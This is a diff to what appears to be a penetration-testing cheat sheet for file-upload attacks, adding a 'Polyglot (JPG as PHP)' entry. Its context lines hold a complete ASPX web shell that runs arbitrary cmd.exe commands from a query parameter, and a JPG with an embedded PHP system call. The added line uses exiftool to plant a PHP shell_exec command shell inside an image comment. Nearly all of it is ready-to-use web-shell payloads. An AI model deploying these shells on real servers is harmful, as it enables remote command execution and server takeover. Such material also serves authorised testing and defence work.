@@ -172,6 +172,9 @@ echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.S
 [###] ASPX
 echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){Response.ContentType="text/plain";Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));Response.End();}}string ExcuteCmd(string arg){ProcessStartInfo ps=new ProcessStartInfo();ps.FileName="cmd.exe";ps.Arguments="/c "+arg;ps.RedirectStandardOutput=true;ps.UseShellExecute=false;Process p=Process.Start(ps);StreamReader stmrdr=p.StandardOutput;string s=stmrdr.ReadToEnd();stmrdr.Close();return s;}</script><HTML><body><form id="cmd" runat="server" onsubmit="return false;"><asp:TextBox id="i" runat="server"></asp:TextBox></form><pre id="r"></pre><script>document.getElementById("i").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();var v=this.value;fetch("?cmd="+encodeURIComponent(v)).then(r=>r.text()).then(t=>{document.getElementById("r").innerText=t;});}});</script></body></HTML>' | tee /Upload/shells/x.aspx
 
+[###] Polygot (JPG as PHP)
+exiftool -Comment='<?php $cmd = $_GET["cmd"] ?? ""; $output = ""; if ($cmd !== "") { $output = shell_exec($cmd); } echo "\n-----START-----\n" . $output . "-----END-----\n"; ?>' Untitled.jpg -o xjpg.php
+
 [###] JPG
 printf "\xff\xd8\xff\xe0<?php system('id'); ?>" | tee /Upload/shells/x.jpg
 exiftool -Comment='<?php system('id'); ?>' /Upload/shells/x.jpg
